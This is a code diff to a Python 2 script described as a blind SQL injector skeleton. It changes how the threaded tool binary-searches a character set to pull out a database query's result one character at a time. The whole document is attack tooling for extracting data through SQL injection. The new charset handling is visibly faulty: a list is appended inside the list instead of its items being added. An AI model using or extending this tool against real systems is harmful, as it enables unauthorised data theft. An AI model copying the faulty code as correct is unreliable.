@@ -4,21 +4,19 @@ import argparse
 import Queue
 
 class Duncan(threading.Thread):
-	def __init__(self,query='select version()',pos=1,q=None,ascii_begin=32,ascii_end=123,debug=0):
+	def __init__(self,query='select version()',pos=1,q=None,charset=[],debug=0):
 		"""Main constructor
 
 		Keyword arguments:
         query -- Query to be executed
         pos -- Character position to test
         q -- Results Queue object
-        ascii_begin -- Start of the ASCII range to test
-        ascii_end -- End of the ASCII range to test
+        charset -- Ordered list of the character codes to be tested
         """
 		threading.Thread.__init__(self)
 		self._query=query
 		self._pos=pos
-		self._min=ascii_begin
-		self._max=ascii_end
+		self._charset=charset
 		self._debug=debug
 
 	def debug(self,level,msg):
@@ -26,19 +24,21 @@ class Duncan(threading.Thread):
 			print msg
 
 	def run(self):
-		while self._max-self._min>1:
-			guess=self._min+(self._max-self._min)/2
-			self.debug(5,"Max: %d Guess: %d Min: %d" % (self._max, guess, self._min))
+		while len(self._charset)>2:
+			guess=self._charset[len(self._charset)/2]
+			self.debug(5,"Max: %d Guess: %d Min: %d" % (self._charset[-1], guess, self._charset[0]))
 			if self.decide(guess):
-				self._max=guess-1
+				#self._max=guess-1
+				self._charset=self._charset[0:len(self._charset)/2]
 			else:
-				self._min=guess
-		if self.decide(self._max):
-			self.debug(1,"Position %d: %c" % (self._pos,chr(self._min)))
-			q.put((self._pos,chr(self._min)))
+				#self._min=guess
+				self._charset=self._charset[len(self._charset)/2:]
+		if self.decide(self._charset[-1]):
+			self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[0])))
+			q.put((self._pos,chr(self._charset[0])))
 		else:
-			self.debug(1,"Position %d: %c" % (self._pos,chr(self._max)))
-			q.put((self._pos,chr(self._max)))
+			self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[-1])))
+			q.put((self._pos,chr(self._charset[-1])))
 
 
 	def decide(self,guess):
@@ -58,30 +58,28 @@ class Duncan(threading.Thread):
 		else:
 			return False
 
-# From http://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks-in-python
-def chunks(l, n):
-    """ Yield successive n-sized chunks from l.
-    """
-    for i in xrange(0, len(l), n):
-		yield l[i:i+n]
-
 parser = argparse.ArgumentParser(description='Duncan - Blind SQL injector skeleton')
 parser.add_argument("--query",required=True,help="The query to be run. Should contain only one attribute.")
 parser.add_argument("--pos-start",default=1,type=int,help="First character position to look up")
 parser.add_argument("--pos-end",default=5,type=int,help="Last character position to look up")
 parser.add_argument("--ascii-start",default=32,type=int,help="Start of the ASCII range to test")
 parser.add_argument("--ascii-end",default=123,type=int,help="End of the ASCII range to test")
-parser.add_argument("--threads-per-position",default=1,type=int,help="Threads per position [EXPERIMENTAL]")
+parser.add_argument("--charset",help="Custom character set")
 parser.add_argument("--debug",default=0,type=int,help="Debug - higher values for more verbosity")
 
 args = parser.parse_args()
 q=Queue.Queue()
 threads=[]
+
+charset=range(args.ascii_start,args.ascii_end+1)
+if args.charset is not None:
+	charset.append([ord(c) for c in list(args.charset)])
+	charset.sort()
+
 for p in xrange(args.pos_start,args.pos_end):
-	for chunk in chunks(range(args.ascii_start,args.ascii_end),(args.ascii_end-args.ascii_start+1)/args.threads_per_position):
-		thread=Duncan(args.query,p,q,chunk[0],chunk[-1]+1,args.debug)
-		threads.append(thread)
-		thread.start()
+	thread=Duncan(args.query,p,q,charset,args.debug)
+	threads.append(thread)
+	thread.start()
 
 for t in threads:
 	t.join()
